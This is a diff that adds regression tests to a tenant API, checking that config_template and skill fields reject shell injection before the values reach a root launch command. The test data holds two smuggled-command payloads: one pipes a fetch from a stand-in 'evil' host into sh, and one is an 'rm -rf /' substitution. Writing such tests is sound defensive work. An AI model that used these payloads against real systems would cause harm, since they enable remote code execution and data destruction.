@@ -190,6 +190,42 @@ class TestCreateTenant:
         resp = api.create_tenant(None)
         assert resp["statusCode"] == 400
 
+    # ── SECURITY: config_template / skills flow into the root SSM launch
+    # command (launch-vm.sh args 5 & 7). Shell metacharacters must be rejected
+    # at create time, or they are arbitrary root RCE on a shared host.
+    @pytest.mark.unit
+    @pytest.mark.regression
+    def test_config_template_injection_rejected(self):
+        api.tenants_table = make_ddb_table()
+        api.hosts_table = make_ddb_table()
+        resp = api.create_tenant(json.dumps({
+            "name": "evil", "config_template": "x; curl evil|sh #"}))
+        assert resp["statusCode"] == 400
+        assert "config_template" in json.loads(resp["body"])["error"]
+
+    @pytest.mark.unit
+    def test_config_template_valid_name_accepted(self):
+        # A well-formed template name must NOT be rejected by the guard
+        # (it fails later on no-host → pending, which is fine — not a 400).
+        api.tenants_table = make_ddb_table()
+        api.hosts_table = make_ddb_table()
+        api.hosts_table.scan.return_value = {"Items": []}
+        _mock_asg.describe_auto_scaling_groups.return_value = {
+            "AutoScalingGroups": [{"DesiredCapacity": 1, "MaxSize": 5}]}
+        resp = api.create_tenant(json.dumps({
+            "name": "ok", "config_template": "bedrock-claude"}))
+        assert resp["statusCode"] == 201
+
+    @pytest.mark.unit
+    @pytest.mark.regression
+    def test_skill_name_injection_rejected(self):
+        api.tenants_table = make_ddb_table()
+        api.hosts_table = make_ddb_table()
+        resp = api.create_tenant(json.dumps({
+            "name": "evil2", "skills": ["ok-skill", "$(rm -rf /)"]}))
+        assert resp["statusCode"] == 400
+        assert "skill" in json.loads(resp["body"])["error"].lower()
+
 
 class TestCreateTenantRestore:
     """restore_from branch in create_tenant."""
